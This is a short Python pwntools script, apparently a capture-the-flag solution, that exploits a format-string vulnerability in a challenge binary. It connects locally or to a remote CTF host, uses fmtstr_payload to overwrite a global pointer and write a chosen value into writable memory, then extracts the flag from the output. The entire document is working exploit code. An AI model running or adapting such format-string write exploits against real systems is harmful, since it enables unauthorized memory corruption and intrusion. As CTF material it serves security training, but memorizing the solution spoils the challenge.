#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31764)

    return r


def main():
    r = conn()

    val = 0x86A693E     # This value has to be reduced by 2 due to the 'r1' function
    global_target = 0x403440
    writable_memory = 0x403000

    # we want to do 2 writes: change 'xd' global variable to a writable memory
    # and then write the value inside the writable memory
    writes = {global_target:   writable_memory,
              writable_memory: val - 2}

    payload = fmtstr_payload(offset = 6, writes = writes, numbwritten = 0)

    r.sendline(payload)
    flag = re.match(r'.*(flag{.+}).*', r.recvlinesS(4)[-1]).group(1)

    log.warn(f'Flag obtained: {flag}')


if __name__ == "__main__":
    main()
